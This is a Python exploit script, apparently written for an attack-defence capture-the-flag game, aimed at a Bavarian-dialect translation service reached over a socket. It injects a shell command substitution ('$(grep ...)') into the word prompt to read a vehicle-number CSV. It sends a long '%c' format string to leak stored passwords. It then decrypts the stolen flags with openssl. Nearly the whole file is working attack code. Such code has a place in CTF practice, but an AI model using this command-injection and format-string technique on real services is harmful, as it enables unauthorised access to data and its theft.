#!/usr/bin/env python

import socket
import sys
import os
import re
import subprocess
from pexpect import fdpexpect


DEFAULT_PROMPT = "Ey du Gradler gib a moi dei Fahrgsteinumma ei:\n"

TRANSLATE_PROMPT = "Welches bayrische Wort moechten sie wissen\?\n"
TRANSLATE_CMD = "I ko koa bayrisch"
TRANSLATE_END = " in deutsch.\n"

MAX_ARG_LEN = 0xfff5


def usage():
    print "Usage: %s <ip> <port> <flag_id>" % os.path.basename(__file__)

def exploit(ip, port, flag_id):
    frame_search = flag_id[:6]
    word_search = flag_id[6:]

    # Open connection
    sock = socket.create_connection((ip, port))
    conn = fdpexpect.fdspawn(sock.fileno())

    # Enter translation mode
    conn.expect(DEFAULT_PROMPT)
    conn.sendline(TRANSLATE_CMD)
    conn.expect(TRANSLATE_PROMPT)

    # Get the encrypted flag
    conn.sendline("$(grep %s info/Fahrzeugnummern.csv)" % frame_search)
    conn.expect(TRANSLATE_PROMPT)
    flags = re.findall(
            r'^(?:Das Wort )?([0-9A-Z]+);([a-zA-Z0-9+/]+)$',
            conn.before, re.M
            )

    # Get the bavarian word
    conn.sendline("%c" * MAX_ARG_LEN)
    conn.expect(TRANSLATE_PROMPT)
    passwords = re.findall(
            r'^([a-zA-Z0-9]+);[a-z]+%s' % (word_search[::-1],),
            conn.before, re.M
            )

    sock.close()
    # Decrypt the flag
    for p in passwords:
        for frame, flag in flags:
            openssl = subprocess.Popen(
                    ("openssl enc -d -aes-256-cbc -a -k %s" % p[::-1]).split(),
                    stdin = subprocess.PIPE,
                    stdout = subprocess.PIPE,
                    stderr = subprocess.PIPE)
            dec = openssl.communicate(flag + "\n")[0]
            if dec.startswith('FLG'):
                print dec,


if __name__ == '__main__':
    if len(sys.argv) < 4:
        usage()
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    flag_id = sys.argv[3]
    exploit(ip, port, flag_id)
